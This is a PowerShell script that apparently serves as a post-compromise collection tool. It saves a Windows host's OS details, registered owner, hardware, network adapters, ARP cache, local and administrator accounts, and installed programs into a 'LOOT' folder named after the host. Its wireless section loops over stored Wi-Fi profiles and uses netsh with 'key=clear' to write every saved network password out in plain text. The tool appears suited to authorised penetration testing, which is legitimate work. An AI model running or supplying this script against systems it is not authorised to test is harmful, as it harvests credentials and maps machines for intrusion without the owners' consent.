function System-Info {
    [CmdletBinding()]
    param ( 
    	  [string]$Output_Dir
    )

    begin{
	# Generating Output File for hardware Info
	$Output_file = "${Output_Dir}\SystemInfo.txt"
	New-Item  "$Output_file" -Force -ItemType File  | Out-Null
    }

    process{
	$HostInfo = (Get-ComputerInfo)

	"[!] OS  Info:"  | tee $Output_file -Append
	"   -----------> OS General Information and characteristics"                                          | tee $Output_file -Append
	"              Operative System          : {0} " -f $HostInfo.WindowsProductName                      | tee $Output_file -Append
	"              Current OS Version        : {0} " -f $HostInfo.WindowsCurrentVersion                   | tee $Output_file -Append
	"              Owner Email               : {0} " -f $HostInfo.WindowsRegisteredOwner                  | tee $Output_file -Append
	"" | tee $Output_file -Append

	"[!] CPU Info:" | tee $Output_file -Append
	"   -----------> CPU General Information and Characteristics "                                        | tee $Output_file -Append
	"              Name                      : {0} " -f $HostInfo.CsProcessors.Name                       | tee $Output_file -Append
	"              Architecture              : {0} " -f $HostInfo.CsProcessors.Architecture               | tee $Output_file -Append
	"              MaxClockSpeed             : {0} " -f $HostInfo.CsProcessors.MaxClockSpeed              | tee $Output_file -Append
	"              NumberOfCores             : {0} " -f $HostInfo.CsProcessors.NumberOfCores              | tee $Output_file -Append
	"              NumberOfLogicalProcessors : {0} " -f $HostInfo.CsProcessors.NumberOfLogicalProcessors  | tee $Output_file -Append
	"" | tee $Output_file -Append
	
	$meminfo = Get-CimInstance -Class Win32_PhysicalMemory
	"[!] Ram Memory Info:"    | tee $Output_file -Append
	"   -----------> Memory Modules Installed  : {0} " -f $meminfo.count | tee $Output_file -Append
	ForEach($Item in 0..($meminfo.count - 1)){
	"              Module Number    : {0}"   -f $Item                                | tee $Output_file -Append
	"              Manufacturer     : {0}"   -f $meminfo[$Item].Manufacturer         | tee $Output_file -Append
	"              Real Capacity    : {0}"   -f $meminfo[$Item].Capacity             | tee $Output_file -Append
	"              Form Factor      : {0}"   -f $meminfo[$Item].FormFactor           | tee $Output_file -Append
	"              Speed            : {0}"   -f $meminfo[$Item].Speed                | tee $Output_file -Append
	"              Min Max voltage  : {0} {0}" -f $meminfo[$Item].MinVoltage, $meminfo[$Item].MaxVoltage   | tee $Output_file -Append
	"" | tee $Output_file -Append	
	}
	
	$StorageInfo = Get-Disk
	"[!] Storage Devices Info: "      | tee $Output_file -Append
	"   -----------> Storage Devices Installed: {0} # Included USB's" -f $StorageInfo.count         | tee $Output_file -Append
	ForEach($Item in 0..($StorageInfo.count - 1)){
	"              Storage Device Number         : {0} " -f $StorageInfo[$Item].Number              | tee $Output_file -Append
	"              Storage Device Manufacturer   : {0} " -f $StorageInfo[$Item].Manufacturer        | tee $Output_file -Append
	"              Storage Device Size           : {0} " -f $StorageInfo[$Item].Size                | tee $Output_file -Append
	"              Storage Device Partitions     : {0} " -f $StorageInfo[$Item].NumberOfPartitions  | tee $Output_file -Append
	"              Storage Device PartitionStyle : {0} " -f $StorageInfo[$Item].PartitionStyle      | tee $Output_file -Append
	"              Storage Device IsReadOnly?    : {0} " -f $StorageInfo[$Item].IsReadOnly          | tee $Output_file -Append

	"" | tee $Output_file -Append	
	}

	"[!] Network Info: "  | tee $Output_file -Append
	"   -----------> Network Adapters  Installed: {0}" -f $HostInfo.CsNetworkAdapters.count | tee $Output_file -Append
	ForEach($Item in $HostInfo.CsNetworkAdapters){
	"              Description      : {0}" -f $Item.Description         | tee $Output_file -Append
	"              ConnectionID     : {0}" -f $Item.ConnectionID        | tee $Output_file -Append
	"              DHCPServer       : {0}" -f $Item.DHCPServer          | tee $Output_file -Append
	"              ConnectionStatus : {0}" -f $Item.ConnectionStatus    | tee $Output_file -Append	
	"              IP Address       : {0}" -f $Item.IPAddresses[0]      | tee $Output_file -Append	
	"              MAC Address      : {0}" -f $Item.IPAddresses[1]      | tee $Output_file -Append	
	"" | tee $Output_file -Append                                  
	}
	
	# If exist Wireless Interfaces, then show stored passwords using netsh
	# This part of the code need's a lot of work because is hard to understand.				FIX HORRIBLE CODE */HERE/*
	if (($HostInfo.CsNetworkAdapters).ConnectionID -Contains "Wi-Fi"){
	   "   -----------> Showing Wireless Connections Info: "            | tee $Output_file -Append
	   # Getting Stored SSID names
	   $SSID_array = @( ((netsh wlan show profile) -match ":[ ][a-zA-Z0-9\ \-]+") | ForEach-Object{ ($_ -split ':')[1] })
	   ForEach($Item in $SSID_array){
	   "              Password for network ${Item}: "                   | tee $Output_file -Append
	   "              {0}" -f ((netsh wlan show profile $Item.trim(' ') key="clear" ) -match "(Contenido de la clave|Key Content)") | tee $Output_file -Append
   	   "" | tee $Output_file -Append                               
	   }
	}

	"   -----------> Arp Cache  Info: "                                  | tee $Output_file -Append
	ForEach($Item in @(arp -a)){
	"              $($Item)"      | tee $Output_file -Append	
	}

	"" | tee $Output_file -Append
	   
	
	$UserInfo = (Get-LocalUser)
	"[!] Users Info: "   | tee $Output_file -Append
	"   -----------> Total Local Users         : {0}" -f $UserInfo.count | tee $Output_file -Append
	ForEach($User in $UserInfo){
	"              {0} - {0} " -f $User.Name, $User.Description          | tee $Output_file -Append
	}
	"" | tee $Output_file -Append

	$TotalLocalEUsers = @( 0 )
	ForEach($User in $UserInfo){
		      if ( $User.Enabled -eq $true ){$TotalLocalEUsers[0]++; $TotalLocalEUsers += $User.Name} 
	}
	"   -----------> Total Local Enabled Users : {0}" -f $TotalLocalEUsers[0] | tee $Output_file -Append
	ForEach($EUser in $TotalLocalEUsers[1..($TotalLocalEUsers.count - 1)]){
	"              {0} - Enabled " -f $EUser			          | tee $Output_file -Append
	}
	"" | tee $Output_file -Append

	"   -----------> Privileged Users: "					  | tee $Output_file -Append
	$PrivilegedGroupName = (Get-LocalGroup -Name "Admin*")[0].Name
	ForEach($PrivilegedUser in (Get-LocalGroupMember -Name $PrivilegedGroupName).Name){
	"              {0} " -f $PrivilegedUser | tee $Output_file -Append
	}
	"" | tee $Output_file -Append

	"[!] Installed Programs: "   | tee $Output_file -Append	
	Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | tee $Output_file -Append
    }			

    end {
    	# IDK What to put here, im noob with powershell :)
    }

}


function main {
    Clear-Host

    # Checking if the LOOT directory exist
    if (( Test-Path ${PSScriptRoot}\LOOT -PathType Container ) -eq 0 ){
	New-Item ${PSScriptRoot}\LOOT -ItemType Directory | Out-Null
	write-Output "[!] Creating main LOOT directory... "
    }

    $loot_dir = "${PSScriptRoot}\LOOT\$(hostname)"
    
    # Checking if a host with the same name exist inside LOOT directory
    if (( Test-Path $loot_dir -PathType Container ) -eq $False){
        New-Item $loot_dir -ItemType Directory | Out-Null
	Write-Output "[!] Creating local host LOOT\$(hostname) directory..."
    } else {
      	Write-Warning " Loot directory with a similar hostname it's already created."
	choice /M "Do you want to continue?"
	if ( $LASTEXITCODE -eq 2 ){
	   return 0
	}
    }

    # Calling system info which will store all data inside $loot_dir
    System-Info $loot_dir
    
}

main $args